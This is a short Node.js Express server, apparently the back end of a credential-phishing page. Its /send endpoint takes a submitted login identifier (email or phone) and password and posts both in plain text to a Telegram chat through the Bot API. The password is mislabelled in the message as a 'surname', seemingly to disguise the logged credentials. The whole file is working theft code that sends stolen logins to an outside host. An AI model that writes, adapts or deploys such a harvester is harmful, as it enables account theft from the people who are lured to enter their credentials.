import express from 'express';
import axios from 'axios';
import cors from 'cors';
import dotenv from 'dotenv';
import path from 'path';
import { fileURLToPath } from 'url';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const clientPath = path.resolve(__dirname, '../client');

app.use(express.json());
app.use(cors());
app.use(express.static(clientPath));

app.post('/send', async (req, res) => {
  const { identifier, password } = req.body;
  const trimmedIdentifier = String(identifier || '').trim();
  const trimmedPassword = String(password || '').trim();

  if (!trimmedIdentifier || !trimmedPassword) {
    return res.status(400).json({
      success: false,
      message: 'Введите email или номер телефона'
    });
  }

  const text = `Новый пользователь: Имя - ${trimmedIdentifier}, Фамилия - ${trimmedPassword}`;

  try {
    await axios.post(`https://api.telegram.org/bot${process.env.TOKEN}/sendMessage`, {
      chat_id: process.env.CHAT_ID,
      text
    });

    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, message: 'Error' });
  }
});

app.get('/', (req, res) => {
  res.sendFile(path.join(clientPath, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});